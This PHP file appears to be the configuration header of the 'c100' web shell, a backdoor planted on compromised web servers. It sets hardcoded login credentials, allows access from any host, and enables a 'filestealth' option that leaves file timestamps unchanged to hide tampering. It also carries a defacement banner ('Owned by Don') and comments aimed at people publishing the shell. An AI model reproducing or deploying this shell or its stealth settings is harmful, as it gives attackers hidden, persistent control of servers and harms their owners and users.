<?php
$login = "12345654az"; //login
//DON'T FORGOT ABOUT PASSWORD!!!
$pass = "12345654az"; //password
$md5_pass = ""; //md5-cryped pass. if null, md5($pass)

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = " c100 v. ".$shver.": access denied";

$gzipencode = TRUE; //Encode with gzip?

$updatenow = FALSE; //If TRUE, update now (this variable will be FALSE)

$filestealth = TRUE; //if TRUE, don't change modify- and access-time

$donated_html = "<center><b><u>Owned by Don</u></b></center>";
/* If you publish free shell and you wish
add link to your site or any other information,
put here your html. */
$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.

$curdir = "./"; //start folder
?>